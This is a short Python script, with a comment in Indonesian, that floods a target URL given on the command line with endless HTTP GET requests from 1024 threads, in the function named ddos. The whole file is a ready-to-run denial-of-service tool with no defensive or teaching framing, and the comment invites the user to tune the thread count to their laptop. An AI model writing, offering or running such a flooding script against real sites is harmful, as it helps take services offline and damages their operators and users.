import socket
import threading
import sys
import requests
import time

def ddos(url):
    while True:
        try:
            response = requests.get(url)
            print(f"Request sent to {url}, Status Code: {response.status_code}")
        except requests.exceptions.RequestException as e:
            print(f"Error sending request to {url}: {e}")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python script.py <target_url>")
        sys.exit(1)

    target_url = sys.argv[1]
    threads = []

    for _ in range(1024):  #Kamu bisa ganti thread nya sesuai kekuatan laptop
        t = threading.Thread(target=ddos, args=(target_url,))
        t.start()
        threads.append(t)

    for t in threads:
        t.join()